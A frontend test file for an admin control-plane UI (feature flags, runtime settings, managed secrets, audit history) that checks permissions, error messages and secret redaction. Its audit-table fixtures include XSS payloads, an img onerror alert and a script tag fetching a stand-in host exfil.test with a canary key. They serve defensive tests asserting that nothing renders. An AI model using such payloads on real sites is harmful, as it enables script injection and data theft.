import { act, fireEvent, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import {
  allowGlobalPermissions,
  resetAuthClientStub,
} from '@/test/auth-client-stub';
import { renderWithProviders } from '@/test/render';

vi.mock('@/features/auth/auth-client', async () => {
  const { authClientStub } = await import('@/test/auth-client-stub');

  return { authClient: authClientStub };
});

const listFeatureFlags = vi.fn();
const setFeatureFlag = vi.fn();
const clearFeatureFlag = vi.fn();
const listRuntimeSettings = vi.fn();
const setRuntimeSetting = vi.fn();
const resetRuntimeSetting = vi.fn();
const listManagedSecrets = vi.fn();
const setManagedSecret = vi.fn();
const removeManagedSecret = vi.fn();
const listControlPlaneAudit = vi.fn();

vi.mock('@/lib/application-api', async () => {
  const actual = await vi.importActual<typeof import('@/lib/application-api')>(
    '@/lib/application-api',
  );

  return {
    ...actual,
    listFeatureFlags: (...args: unknown[]) => listFeatureFlags(...args),
    setFeatureFlag: (...args: unknown[]) => setFeatureFlag(...args),
    clearFeatureFlag: (...args: unknown[]) => clearFeatureFlag(...args),
    listRuntimeSettings: (...args: unknown[]) => listRuntimeSettings(...args),
    setRuntimeSetting: (...args: unknown[]) => setRuntimeSetting(...args),
    resetRuntimeSetting: (...args: unknown[]) => resetRuntimeSetting(...args),
    listManagedSecrets: (...args: unknown[]) => listManagedSecrets(...args),
    setManagedSecret: (...args: unknown[]) => setManagedSecret(...args),
    removeManagedSecret: (...args: unknown[]) => removeManagedSecret(...args),
    listControlPlaneAudit: (...args: unknown[]) =>
      listControlPlaneAudit(...args),
  };
});

const { ControlPlaneBlock } = await import('./control-plane-block');
const { ApiError, ApiUnavailableError } = await import('@/lib/application-api');

const flag = (overrides: Record<string, unknown> = {}) => ({
  key: 'agents.enabled',
  description: 'Whether agent runs may be accepted.',
  enabled: false,
  source: 'default' as const,
  defaultEnabled: false,
  platformOverride: undefined,
  organizationOverride: undefined,
  organizationOverridable: true,
  ...overrides,
});

const setting = (overrides: Record<string, unknown> = {}) => ({
  key: 'knowledge.retrieval_max_chunks',
  description: 'How many chunks retrieval may return.',
  value: 12,
  isDefault: true,
  storedValueRejected: false,
  defaultValue: 12,
  sensitivity: 'public',
  editable: true,
  updatedAt: undefined,
  ...overrides,
});

const secret = (overrides: Record<string, unknown> = {}) => ({
  key: 'openai.api_key',
  description: 'OpenAI API key.',
  configured: false,
  label: undefined,
  algorithm: undefined,
  keyVersion: undefined,
  lastRotatedAt: undefined,
  updatedAt: undefined,
  usable: false,
  ...overrides,
});

const openTab = async (name: RegExp) =>
  userEvent.click(await screen.findByRole('tab', { name }));

beforeEach(() => {
  resetAuthClientStub();
  vi.clearAllMocks();

  listFeatureFlags.mockResolvedValue([flag()]);
  listRuntimeSettings.mockResolvedValue([setting()]);
  listManagedSecrets.mockResolvedValue([secret()]);
  listControlPlaneAudit.mockResolvedValue({
    items: [
      {
        id: 'audit_1',
        occurredAt: '2026-08-24T12:00:00.000Z',
        actorUserId: 'user_1',
        resource: 'featureFlag',
        action: 'featureFlag.setPlatformOverride',
        resourceKey: 'agents.enabled',
        organizationId: null,
        before: null,
        after: { kind: 'featureFlagOverride', enabled: true },
      },
    ],
    nextCursor: null,
  });
});

describe('a listing that fails', () => {
  it('says the API could not be reached, distinctly from a refusal', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(
      new ApiUnavailableError(new TypeError('Failed to fetch')),
    );

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/could not be reached/i);
    expect(screen.queryByText(/something went wrong/i)).not.toBeInTheDocument();
  });

  it('says the reader was refused when the server refused them', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/do not have permission to use the control plane/i);
  });

  it('tells an operator whose session expired to sign in, not that they lack a role', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(new ApiError(401, 'UNAUTHORIZED'));

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/session has expired/i);
    expect(
      screen.queryByText(/do not have permission to use the control plane/i),
    ).not.toBeInTheDocument();
  });

  it('asks again when the operator presses retry', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValueOnce(new ApiError(500, 'INTERNAL'));

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/something went wrong/i);
    expect(listFeatureFlags).toHaveBeenCalledTimes(1);

    listFeatureFlags.mockResolvedValue([flag()]);
    fireEvent.click(screen.getByRole('button', { name: /try again/i }));

    await screen.findByText('agents.enabled');
    expect(listFeatureFlags).toHaveBeenCalledTimes(2);
  });

  it('cancels the listing it abandoned', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    const [signal] = listFeatureFlags.mock.calls[0] as [AbortSignal];

    expect(signal).toBeInstanceOf(AbortSignal);
  });

  it('lets the operator dismiss a write failure', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockRejectedValue(new ApiError(500, 'INTERNAL'));

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));
    await screen.findByText(/something went wrong/i);

    fireEvent.click(screen.getByRole('button', { name: /dismiss/i }));

    await waitFor(() =>
      expect(
        screen.queryByText(/something went wrong/i),
      ).not.toBeInTheDocument(),
    );
  });
});

describe('ControlPlaneBlock', () => {
  it('refuses a reader without control-plane read, and asks the server for nothing', async () => {
    allowGlobalPermissions('user:list');

    renderWithProviders(<ControlPlaneBlock />);

    expect(
      screen.getByText(/do not have permission to use the control plane/i),
    ).toBeInTheDocument();

    expect(listFeatureFlags).not.toHaveBeenCalled();
    expect(listRuntimeSettings).not.toHaveBeenCalled();
    expect(listManagedSecrets).not.toHaveBeenCalled();
    expect(listControlPlaneAudit).not.toHaveBeenCalled();
  });

  it('loads only the panel that is open', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText('agents.enabled');

    expect(listManagedSecrets).not.toHaveBeenCalled();

    await openTab(/credentials/i);

    await waitFor(() => expect(listManagedSecrets).toHaveBeenCalled());
  });

  it('loads safe audit history only when its tab is opened', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    await openTab(/audit history/i);

    await screen.findByText(/set platform override/i);
    expect(listControlPlaneAudit).toHaveBeenCalledTimes(1);
    expect(screen.getByText('user_1')).toBeInTheDocument();
    expect(screen.getByText(/no stored state → enabled/i)).toBeInTheDocument();
  });
});

describe('feature flags', () => {
  it('shows a read-only reader the state without letting them change it', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText('agents.enabled');

    expect(screen.getByRole('button', { name: /enable/i })).toBeDisabled();
    expect(
      screen.getByRole('button', { name: /clear override/i }),
    ).toBeDisabled();
  });

  it('sends the opposite of the current state and shows what the server returns', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockResolvedValue(
      flag({ enabled: true, source: 'platform', platformOverride: true }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));

    await screen.findByText(/^On$/);
    expect(setFeatureFlag).toHaveBeenCalledWith('agents.enabled', true);
    expect(screen.getByText(/platform override/i)).toBeInTheDocument();
  });

  it('does not offer clearing a flag that has no override', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    expect(screen.getByRole('button', { name: /enable/i })).toBeEnabled();
    expect(
      screen.getByRole('button', { name: /clear override/i }),
    ).toBeDisabled();
  });

  it('offers clearing only when an override exists', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listFeatureFlags.mockResolvedValue([
      flag({ enabled: true, source: 'platform', platformOverride: true }),
    ]);
    clearFeatureFlag.mockResolvedValue(flag());

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    const clear = screen.getByRole('button', { name: /clear override/i });
    expect(clear).toBeEnabled();

    fireEvent.click(clear);

    await screen.findByText(/code default/i);
    expect(clearFeatureFlag).toHaveBeenCalledWith('agents.enabled');
  });

  it('locks only the row being written', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listFeatureFlags.mockResolvedValue([
      flag({ key: 'a.one' }),
      flag({ key: 'b.two' }),
    ]);

    let releaseFirst: (value: unknown) => void = () => {};
    setFeatureFlag.mockImplementationOnce(
      () => new Promise((resolve) => (releaseFirst = resolve)),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('a.one');

    const [enableA, enableB] = screen.getAllByRole('button', {
      name: /enable/i,
    });

    fireEvent.click(enableA);

    await waitFor(() => expect(enableA).toBeDisabled());
    expect(enableB).toBeEnabled();

    releaseFirst(flag({ key: 'a.one', enabled: true }));
  });

  it('reports a refusal without clearing the table', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));

    await screen.findByText(/do not have permission/i);
    expect(screen.getByText('agents.enabled')).toBeInTheDocument();
  });
});

describe('runtime settings', () => {
  it('sends the typed value as a number rather than a string', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(
      setting({ value: 40, isDefault: false }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '40' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'knowledge.retrieval_max_chunks',
        40,
      ),
    );
  });

  it('lets the server reject an out-of-range value and reports its refusal', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/refused/i);
    expect(setRuntimeSetting).toHaveBeenCalledWith(
      'knowledge.retrieval_max_chunks',
      5000,
    );
  });

  it('shows the reasons the server gave for refusing a value', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(
      new ApiError(422, 'VALIDATION_ERROR', {
        kind: 'validation',
        fields: [],
        messages: ['Too big: expected number to be <=100'],
      }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/expected number to be <=100/i);
  });

  it('keeps a refused value in the field so it can be corrected', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/refused/i);
    expect(input).toHaveValue('5000');
  });

  it('drops an abandoned edit when the row is reset', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ value: 40, isDefault: false }),
    ]);
    resetRuntimeSetting.mockResolvedValue(setting());

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '99' } });
    fireEvent.click(screen.getByRole('button', { name: /reset/i }));

    await waitFor(() => expect(input).toHaveValue('12'));
    expect(screen.getByText(/using the default/i)).toBeInTheDocument();
  });

  it('shows the value the server stored, not the one that was typed', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(
      setting({ value: 100, isDefault: false }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      /knowledge.retrieval_max_chunks/i,
    );
    fireEvent.change(input, { target: { value: '104' } });
    fireEvent.click(screen.getByRole('button', { name: /save/i }));

    await waitFor(() => expect(input).toHaveValue('100'));
  });

  it('does not turn an emptied numeric field into zero', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(setting());

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      /knowledge.retrieval_max_chunks/i,
    );
    fireEvent.change(input, { target: { value: '' } });
    fireEvent.click(screen.getByRole('button', { name: /save/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'knowledge.retrieval_max_chunks',
        '',
      ),
    );
  });

  it('keeps an abandoned edit when the reset itself is refused', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ value: 40, isDefault: false }),
    ]);
    resetRuntimeSetting.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      /knowledge.retrieval_max_chunks/i,
    );
    fireEvent.change(input, { target: { value: '99' } });
    fireEvent.click(screen.getByRole('button', { name: /reset/i }));

    await screen.findByText(/do not have permission/i);
    expect(input).toHaveValue('99');
  });

  it('says when a stored value is being ignored, and still offers reset', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ isDefault: true, storedValueRejected: true }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    await screen.findByText(/stored value refused/i);
    expect(screen.getByRole('button', { name: /reset/i })).toBeEnabled();
  });

  it.each(['True', '1', 'yes', 'ON'])(
    'does not silently read %s as false for a boolean setting',
    async (typed) => {
      allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
      listRuntimeSettings.mockResolvedValue([
        setting({
          key: 'spec.boolean_setting',
          value: true,
          defaultValue: true,
        }),
      ]);
      setRuntimeSetting.mockRejectedValue(
        new ApiError(422, 'VALIDATION_ERROR'),
      );

      renderWithProviders(<ControlPlaneBlock />);
      await openTab(/settings/i);

      const input = await screen.findByLabelText('spec.boolean_setting');
      fireEvent.change(input, { target: { value: typed } });
      fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

      await waitFor(() =>
        expect(setRuntimeSetting).toHaveBeenCalledWith(
          'spec.boolean_setting',
          typed,
        ),
      );
    },
  );

  it.each([
    ['true', true],
    ['false', false],
  ])('sends %s as a boolean', async (typed, expected) => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ key: 'spec.boolean_setting', value: true, defaultValue: true }),
    ]);
    setRuntimeSetting.mockResolvedValue(
      setting({ key: 'spec.boolean_setting', value: expected }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText('spec.boolean_setting');
    fireEvent.change(input, { target: { value: typed } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'spec.boolean_setting',
        expected,
      ),
    );
  });

  it('does not offer reset for a setting that was never configured', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    await screen.findByText('knowledge.retrieval_max_chunks');
    expect(screen.getByRole('button', { name: /reset/i })).toBeDisabled();
  });
});

describe('managed secrets', () => {
  it('never renders a credential, because none is ever returned', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      {
        ...secret({ configured: true, usable: true, label: 'billing account' }),
        value: 'sk-CANARY-not-a-real-key',
      },
    ]);

    const { container } = renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    expect(container.innerHTML).not.toContain('sk-CANARY');
    expect(screen.getByText(/billing account/i)).toBeInTheDocument();
  });

  it('shows when a configured credential was last rotated', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      secret({
        configured: true,
        usable: true,
        lastRotatedAt: '2026-02-02T09:30:00.000Z',
      }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText(/last rotated/i);
  });

  it('reports the reason the server gave for refusing a credential', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockRejectedValue(
      new ApiError(422, 'VALIDATION_ERROR', {
        kind: 'validation',
        fields: [],
        messages: [
          'The value does not start with "sk-", so it is probably a different provider\'s credential.',
        ],
      }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, { target: { value: 'not-a-real-key-000000000' } });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await screen.findByText(/does not start with/i);
  });

  it('removes the credential the operator pointed at', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    listManagedSecrets.mockResolvedValue([
      secret({ key: 'openai.api_key', configured: true, usable: true }),
    ]);
    removeManagedSecret.mockResolvedValue(secret({ key: 'openai.api_key' }));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.click(await screen.findByRole('button', { name: /remove/i }));

    await waitFor(() =>
      expect(removeManagedSecret).toHaveBeenCalledWith('openai.api_key'),
    );
  });

  it('does not offer removing a slot that holds nothing', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    expect(screen.getByRole('button', { name: /remove/i })).toBeDisabled();
  });

  it('sends the note the operator typed alongside the credential', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockResolvedValue(secret({ configured: true }));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.change(await screen.findByLabelText(/new value for openai/i), {
      target: { value: 'not-a-real-key-000000000' },
    });
    fireEvent.change(screen.getByLabelText(/label for openai/i), {
      target: { value: 'billing account' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await waitFor(() =>
      expect(setManagedSecret).toHaveBeenCalledWith(
        'openai.api_key',
        'not-a-real-key-000000000',
        'billing account',
      ),
    );
  });

  it('refuses to send a note that carries the credential, and sends nothing', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.change(await screen.findByLabelText(/new value for openai/i), {
      target: { value: 'not-a-real-key-000000000' },
    });
    fireEvent.change(screen.getByLabelText(/label for openai/i), {
      target: { value: 'pasted here first: not-a-real-key-000000000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await screen.findByText(/note contains the credential/i);
    expect(setManagedSecret).not.toHaveBeenCalled();
  });

  it('requires the separate credential permission, not merely control-plane write', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    expect(screen.getByRole('button', { name: /^store$/i })).toBeDisabled();
    expect(screen.getByLabelText(/new value for openai/i)).toBeDisabled();
  });

  it('suppresses browser autofill on the credential field', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);

    expect(input).toHaveAttribute('type', 'password');
    expect(input).toHaveAttribute('autocomplete', 'new-password');
  });

  it('clears the credential field once the write returns', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockResolvedValue(
      secret({ configured: true, usable: true }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, {
      target: { value: 'sk-fake-test-credential-0000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await waitFor(() =>
      expect(setManagedSecret).toHaveBeenCalledWith(
        'openai.api_key',
        'sk-fake-test-credential-0000',
        undefined,
      ),
    );

    await waitFor(() => expect(input).toHaveValue(''));
  });

  it('clears the credential field even when the write is refused', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, {
      target: { value: 'sk-fake-rejected-value-0000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await screen.findByText(/refused/i);
    expect(input).toHaveValue('');
  });

  it('distinguishes a credential that cannot be decrypted from a missing one', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      secret({ configured: true, usable: false }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText(/cannot be decrypted/i);
    expect(screen.getByText(/^Configured$/)).toBeInTheDocument();
  });
});

describe('the audit table projects the payload it is handed', () => {
  const CANARY = 'sk-live-AUDITCANARY-9f3c2a71b4e8-do-not-render';

  const event = (
    id: string,
    before: unknown,
    after: unknown,
  ): Record<string, unknown> => ({
    id,
    occurredAt: '2026-08-24T12:00:00.000Z',
    actorUserId: 'user_1',
    resource: 'runtimeSetting',
    action: 'runtimeSetting.set',
    resourceKey: 'knowledge.retrieval_max_chunks',
    organizationId: null,
    before,
    after,
  });

  const HOSTILE = [
    event('audit_unknown_kind', null, { kind: 'somethingNew', secret: CANARY }),
    event(
      'audit_widened_known_kind',
      { kind: 'runtimeSettingValue', redacted: true, value: CANARY },
      { kind: 'runtimeSettingValue', redacted: false, value: CANARY },
    ),
    event(
      'audit_secret_slot',
      { kind: 'managedSecretSlot', configured: false },
      { kind: 'managedSecretSlot', configured: true, plaintext: CANARY },
    ),
    event(
      'audit_secret_key_version',
      { kind: 'managedSecretSlot', configured: true, keyVersion: CANARY },
      {
        kind: 'managedSecretSlot',
        configured: true,
        keyVersion: `${CANARY}-next`,
      },
    ),
    event(
      'audit_secret_key_version_lowercase',
      {
        kind: 'managedSecretSlot',
        configured: true,
        keyVersion: CANARY.toLowerCase(),
      },
      {
        kind: 'managedSecretSlot',
        configured: true,
        keyVersion: `${CANARY.toLowerCase()}-next`,
      },
    ),
    event(
      'audit_flag_note',
      { kind: 'featureFlagOverride', enabled: false, note: CANARY },
      { kind: 'featureFlagOverride', enabled: true, note: CANARY },
    ),
    event('audit_nested', { deep: { deeper: [{ leaked: CANARY }] } }, [CANARY]),
    event('audit_primitive', CANARY, 42),
    event(
      'audit_markup',
      `<img src=x onerror="alert('${CANARY}')">`,
      `<script>fetch('https://exfil.test/${CANARY}')</script>`,
    ),
    {
      ...event('audit_unknown_action', null, null),
      action: `runtimeSetting.${CANARY}`,
    },
    { ...event('audit_bad_timestamp', null, null), occurredAt: 'not-a-time' },
  ];

  beforeEach(() => {
    listControlPlaneAudit.mockResolvedValue({
      items: HOSTILE,
      nextCursor: null,
    });
  });

  const auditRows = () => screen.getAllByRole('row').slice(1);

  it('never puts audit payload data into the DOM', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    await screen.findAllByRole('row');
    expect(auditRows()).toHaveLength(HOSTILE.length);

    expect(document.body.innerHTML).not.toContain(CANARY);
    expect(document.body.textContent).not.toContain(CANARY);

    expect(document.body.innerHTML).not.toContain('onerror');

    for (const row of auditRows()) {
      expect(row.querySelector('script')).toBeNull();
      expect(row.querySelector('img')).toBeNull();
    }
  });

  it('renders the identifying columns verbatim, as escaped text', async () => {
    allowGlobalPermissions('controlPlane:read');
    listControlPlaneAudit.mockResolvedValue({
      items: [
        {
          ...event('audit_identifiers', null, null),
          actorUserId: 'user_visible',
          resourceKey: 'knowledge.retrieval_max_chunks',
          organizationId: 'org_visible',
        },
      ],
      nextCursor: null,
    });

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    expect(await screen.findByText('user_visible')).toBeInTheDocument();
    expect(screen.getByText('org_visible')).toBeInTheDocument();
    expect(
      screen.getByText('knowledge.retrieval_max_chunks'),
    ).toBeInTheDocument();
  });

  it('renders a well-formed key version on each side of a re-encryption', async () => {
    allowGlobalPermissions('controlPlane:read');

    const slot = (keyVersion: string) => ({
      kind: 'managedSecretSlot',
      configured: true,
      algorithm: 'aes-256-gcm',
      keyVersion,
    });

    listControlPlaneAudit.mockResolvedValue({
      items: [
        {
          ...event(
            'audit_reencrypt',
            slot('keyver-alpha'),
            slot('keyver-beta'),
          ),
          resource: 'managedSecret',
          action: 'managedSecret.reencrypt',
          resourceKey: 'openai.api_key',
        },
      ],
      nextCursor: null,
    });

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);
    await screen.findAllByRole('row');

    const { english } = await import('@/test/render');
    const cells = screen.getAllByRole('row')[1].querySelectorAll('td');

    expect(cells[2]?.textContent).toBe(
      english.ControlPlane.audit.action.managedSecret.reencrypt,
    );
    expect(
      cells[cells.length - 1]?.textContent?.replace(/\s+/g, ' ').trim(),
    ).toBe('Configured (keyver-alpha) → Configured (keyver-beta)');
  });

  it('says a key version was withheld rather than showing the plain label', async () => {
    allowGlobalPermissions('controlPlane:read');

    listControlPlaneAudit.mockResolvedValue({
      items: [
        event(
          'audit_reencrypt_hidden',
          { kind: 'managedSecretSlot', configured: true, keyVersion: 'V2' },
          { kind: 'managedSecretSlot', configured: true },
        ),
      ],
      nextCursor: null,
    });

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);
    await screen.findAllByRole('row');

    const { english } = await import('@/test/render');
    const cells = screen.getAllByRole('row')[1].querySelectorAll('td');
    const summary = cells[cells.length - 1]?.textContent ?? '';

    expect(summary).toContain(
      english.ControlPlane.audit.state.configuredKeyHidden,
    );
    expect(summary).not.toContain('V2');
    expect(summary).toContain(english.ControlPlane.audit.state.configured);
  });

  it('still summarises each change from its own closed vocabulary', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    await screen.findAllByRole('row');

    const { english } = await import('@/test/render');
    const vocabulary: string[] = Object.values(
      english.ControlPlane.audit.state,
    );

    const summaries = screen
      .getAllByRole('row')
      .slice(1)
      .map((row) => {
        const cells = row.querySelectorAll('td');

        return cells[cells.length - 1]?.textContent ?? '';
      });

    const actions = screen
      .getAllByRole('row')
      .slice(1)
      .map((row) => row.querySelectorAll('td')[2]?.textContent ?? '');

    const actionVocabulary: string[] = [
      english.ControlPlane.audit.action.unknown,
      ...Object.values(english.ControlPlane.audit.action.runtimeSetting),
    ];

    for (const action of actions) expect(actionVocabulary).toContain(action);

    expect(summaries).toHaveLength(HOSTILE.length);

    for (const summary of summaries) {
      const parts = summary.split('→').map((part) => part.trim());

      expect(parts).toHaveLength(2);

      for (const part of parts) expect(vocabulary).toContain(part);
    }
  });

  it('renders re-encryption audit entries with explicit key versions', async () => {
    allowGlobalPermissions('controlPlane:read');
    listControlPlaneAudit.mockResolvedValue({
      items: [
        {
          id: 'audit_reencrypt_versioned',
          occurredAt: '2026-08-24T12:00:00.000Z',
          actorUserId: null,
          resource: 'managedSecret',
          action: 'managedSecret.reencrypt',
          resourceKey: 'openai.api_key',
          organizationId: null,
          before: {
            kind: 'managedSecretSlot',
            configured: true,
            algorithm: 'aes-256-gcm',
            keyVersion: 'v1',
          },
          after: {
            kind: 'managedSecretSlot',
            configured: true,
            algorithm: 'aes-256-gcm',
            keyVersion: 'v2',
          },
        },
        {
          id: 'audit_reencrypt_legacy',
          occurredAt: '2026-08-24T12:05:00.000Z',
          actorUserId: null,
          resource: 'managedSecret',
          action: 'managedSecret.reencrypt',
          resourceKey: 'openai.api_key',
          organizationId: null,
          before: {
            kind: 'managedSecretSlot',
            configured: true,
            algorithm: 'aes-256-gcm',
            keyVersion: null,
          },
          after: {
            kind: 'managedSecretSlot',
            configured: true,
            algorithm: 'aes-256-gcm',
            keyVersion: 'v2',
          },
        },
      ],
      nextCursor: null,
    });

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');
    await openTab(/audit history/i);

    const reencryptActions = await screen.findAllByText(
      'Re-encrypted credential',
    );
